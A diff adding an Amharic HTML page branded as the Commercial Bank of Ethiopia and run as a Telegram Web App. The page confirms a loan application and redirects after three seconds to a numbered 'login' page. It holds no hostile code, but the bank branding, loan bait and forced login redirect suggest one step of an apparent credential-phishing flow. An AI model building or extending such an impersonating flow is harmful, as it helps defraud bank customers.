@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="am">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ማመልከቻ ገብቷል - የኢትዮጵያ ንግድ ባንክ</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --cbe-purple: #51255e; --bg-color: #ffffff; --text-muted: #666; --border-color: #dddddd; }
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #f9f9f9; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        .card { background: #fff; width: 90%; max-width: 400px; padding: 40px 24px; border-radius: 20px; border: 1px solid var(--border-color); display: flex; flex-direction: column; align-items: center; text-align: center; }
+        .check-circle { width: 80px; height: 80px; background-color: var(--cbe-purple); border-radius: 50%; display: flex; justify-content: center; align-items: center; margin-bottom: 24px; color: white; font-size: 36px; font-weight: bold; }
+        .main-title { font-size: 24px; color: var(--cbe-purple); margin: 0 0 16px; font-weight: 800; }
+        .message-text { color: var(--text-muted); font-size: 14.5px; margin: 0 0 16px; line-height: 1.5; }
+        .redirect-box { background-color: #f4f0f5; border-radius: 10px; padding: 14px 20px; margin: 20px 0 16px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 10px; color: var(--cbe-purple); font-weight: 700; font-size: 14px; }
+        .spinner { width: 18px; height: 18px; border: 2.5px solid #d4c1db; border-top: 2.5px solid var(--cbe-purple); border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn-outline { background-color: transparent; color: #111; border: 1px solid var(--border-color); width: 100%; padding: 14px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; }
+    </style>
+</head>
+<body>
+<div class="card">
+    <div class="check-circle">✓</div>
+    <h1 class="main-title">ማመልከቻው ተልኳል</h1>
+    <p class="message-text">የብድር ማመልከቻዎ በተሳካ ሁኔታ ደርሷል። እባክዎ ለዕውቅና (መግቢያ) ትንሽ ይጠብቁ።</p>
+    <div class="redirect-box">
+        <div class="spinner"></div>
+        <span>ወደ መግቢያ ገጽ በ <span id="timer">3</span> ሰከንድ ውስጥ ይተላለፋሉ...</span>
+    </div>
+    <button type="button" class="btn-outline" onclick="goToPage6()">አሁን ግባ</button>
+</div>
+<script>
+    let timeLeft = 3, interval;
+    function goToPage6() { if (interval) clearInterval(interval); window.location.href = "/page6"; }
+    window.onload = () => {
+        if (window.Telegram?.WebApp) { window.Telegram.WebApp.ready(); window.Telegram.WebApp.expand(); }
+        interval = setInterval(() => {
+            timeLeft--;
+            if (document.getElementById('timer')) document.getElementById('timer').textContent = timeLeft;
+            if (timeLeft <= 0) { clearInterval(interval); goToPage6(); }
+        }, 1000);
+    };
+</script>
+</body>
+</html>
